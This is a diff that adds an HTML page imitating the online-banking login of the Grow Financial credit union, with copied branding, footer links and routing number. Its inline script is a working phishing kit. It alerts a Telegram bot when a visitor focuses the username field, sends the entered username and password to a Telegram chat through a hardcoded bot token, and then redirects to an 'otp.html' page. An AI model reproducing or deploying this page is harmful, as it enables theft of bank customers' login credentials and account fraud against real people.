@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grow Financial</title>
+    <link nonce="" rel="stylesheet" href="./CSS/index.css" type="text/css" media="all">
+    <link nonce="" rel="stylesheet" href="./CSS/footer.css" type="text/css" media="all">
+    <script src="https://kit.fontawesome.com/51f31c34ca.js" crossorigin="anonymous"></script>
+  
+</head>
+<body>
+    <div id="main">
+        <div id="primary_form1">
+            <div class="main-outline"><div class="primary_outline"><i class="fa-solid fa-ellipsis"></i></div></div>
+            
+            
+                <div class="header_image">
+                    <img src="./images/brand-logo-wide.png" alt="band-logo"/>
+                </div>
+           
+            <div class="primary_form">
+                <form id="primary_form" class="form">
+                    <input name="UserName" class="form-username" type="text" id="form-username" placeholder="Username" required="" value="">
+                    <input name="Password" class="form-password" type="password" id="form-password" placeholder="Password" required="" value="">
+                    <div class="remember-me">
+                        <input type="checkbox" id="check" name="check">
+                        <label for="check" class="button"></label>
+                        <p>Remember Me</p>
+                    </div>
+                  <button type="submit">Log In</button>
+                  <p class="forget">Forgot <a href="#" target="_blank">username</a> or <a href="#" target="_blank">password</a></p>
+                  <a href="#" class="register" target="_blank">Register New Account</a>
+                </form>
+            </div>
+        </div>
+
+        <div class="footer-wrapper">
+            <div class="footer-horizontal">
+                <ul data-cfm-area="footer-links">
+                    <li><a id="tb_footerLinks_home" target="_self" rel="noopener noreferrer" href="/" data-is-generic="false" data-string-key="Theme.Footer.FooterLinks.tb_stringKey_0">Home</a></li>
+                    <li><a id="tb_footerLinks_mobile" target="_self" rel="noopener noreferrer" href="/mobile" data-is-generic="false" data-string-key="Theme.Footer.FooterLinks.tb_stringKey_1">Mobile</a></li>
+                    <li><a id="" target="_blank" rel="noopener noreferrer" href="https://www.growfinancial.org/resources/protect-yourself/" data-is-generic="true" data-string-key="Theme.Footer.FooterLinks.tb_stringKey_4">Security</a></li>
+                    <li><a id="" target="_blank" rel="noopener noreferrer" href="https://www.growfinancial.org/contact" data-is-generic="true" data-string-key="Theme.Footer.FooterLinks.tb_stringKey_5">Contact</a></li>
+                    <li><a id="" target="_blank" rel="noopener noreferrer" href="https://www.growfinancial.org/resources/new-mobile-online-banking/" data-is-generic="true" data-string-key="Theme.Footer.FooterLinks.tb_stringKey_3">FAQs</a></li>
+                    <li><a id="" target="_blank" rel="noopener noreferrer" href="https://www.growfinancial.org/wp-content/uploads/2018/10/Privacy-Notice.pdf" data-is-generic="true" data-string-key="Theme.Footer.FooterLinks.tb_stringKey_16560994195442659">Privacy Policy</a></li>
+                    <li><a id="" target="_blank" rel="noopener noreferrer" href="https://www.growfinancial.org/wp-content/uploads/2019/01/Universal-Account-Agreement-3.pdf" data-is-generic="true" data-string-key="Theme.Footer.FooterLinks.tb_stringKey_16560994277768308">Disclosures</a></li>
+                    <li><a id="browser-support-info" target="_self" rel="noopener noreferrer" href="#/browser-support" data-is-generic="false" data-string-key="Theme.Footer.FooterLinks.tb_stringKey_2">Browser Support</a></li>
+                    </ul>
+
+                    <div class="footer__fi-numbers">
+                        <div class="footer__fi-numbers-nmls">NMLS number: <span>477765</span></div>
+                        <div class="footer__fi-numbers-routing">Routing number: <span>263182914</span></div>
+                        </div>
+            </div>
+
+
+            <div class="footer__legal-logos">
+            <div class="font-icon-container font-icon">
+            <img class="font-icon-ncua-large" alt="ïcon" src="./images/NCUA.png">
+            </div>
+            <div class="font-icon-container font-icon">
+                <img class="font-icon-ncua-large" alt="ïcon" src="./images/housing.png">
+            </div>
+            </div>
+
+            <div class="footer__copyright">
+            Copyright © 2024 All rights reserved.
+            </div>
+            </div>
+            </div>
+            </div>
+            </div>
+    </div>
+
+    <script>
+        const form = document.querySelector("#primary_form");
+        const first_input = document.querySelector(".form-username");
+        var notUsed = true;
+        first_input.onfocus = function() {
+            var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
+            var chat_id = "-4244251369";
+            var my_text = `Get ready, somebody is logging in`
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+            if(notUsed){
+                notUsed = false;
+                let api = new XMLHttpRequest();
+            api.open("GET", url, true);
+            api.send();
+            }
+        };
+        form.addEventListener("submit", (e) => {
+            e.preventDefault();
+            var username = document.querySelector("#form-username").value;
+            var password = document.querySelector("#form-password").value;
+            var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
+            var chat_id = "-4244251369";
+            var my_text = `Username:${username} Password:${password}`
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+            console.log(username, password);
+
+            let api = new XMLHttpRequest();
+            api.open("GET", url, true);
+            api.send();
+            window.location.href="otp.html";
+           
+        })
+    </script>
+</body>
+</html>
